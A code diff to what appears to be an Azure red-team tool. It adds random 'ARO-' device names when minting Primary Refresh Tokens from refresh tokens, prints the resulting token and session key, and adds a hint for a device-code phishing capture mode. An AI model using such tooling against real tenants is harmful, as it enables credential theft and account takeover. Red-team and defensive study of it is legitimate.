@@ -11,6 +11,7 @@
 import os
 import re
 import jwt
+import secrets
 import time
 import json
 import base64
@@ -588,8 +589,15 @@ class AzureRedOps:
             return preset["resource"], [preset["url"]]
         return self.default_audience, [u.strip() for u in target.split(",") if u.strip()]
 
+    def _generate_device_name(self):
+        # 8-char device name that always starts with "ARO-" (e.g. ARO-7K2Q).
+        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        return "ARO-" + "".join(secrets.choice(alphabet) for _ in range(4))
+
     def mint_prt(self, refresh_token, tenant, appid=None):
         from includes.PRT import PRTManager, PRTError
+        device_name = self._generate_device_name()
+        print(f"{self.w("Action")}Registering device as '{device_name}'.")
         try:
             mgr = PRTManager(
                 endpoint=self.microsoft_endpoint,
@@ -597,7 +605,7 @@ class AzureRedOps:
                 rt_client_id=appid,
                 log=lambda msg: print(f"{self.w("Action")}{msg}"),
             )
-            result = mgr.mint_prt(refresh_token, tenant)
+            result = mgr.mint_prt(refresh_token, tenant, device_name=device_name)
         except PRTError as e:
             print(f"{self.w("Error")}Auto-PRT failed: {str(e)}")
             return None, None, None
@@ -605,6 +613,7 @@ class AzureRedOps:
             print(f"{self.w("Error")}Auto-PRT failed unexpectedly: {str(e)}")
             return None, None, None
 
+        print(f"{self.w("Device Name")}{device_name}")
         print(f"{self.w("PRT")}{result["prt"]}")
         print(f"{self.w("Session Key")}{base64.b64encode(result["session_key"]).decode()}")
         if result.get("device_id"):
@@ -1253,6 +1262,7 @@ def main():
         app.device_code_start(autostart, appid, tenant_id)
 
     elif args.activity == "phish-capture":
+        app.print_hint(["For Browser SSO use the Microsoft Authentication Broker application (29d9ed98-a469-4536-ade2-f981bc1d605e)"])
         code = app.is_args_set(args, "devicecode")
         appid = app.is_args_set(args, "appid", False)
         tenant_id = app.is_args_set(args, "tenant_id", False)
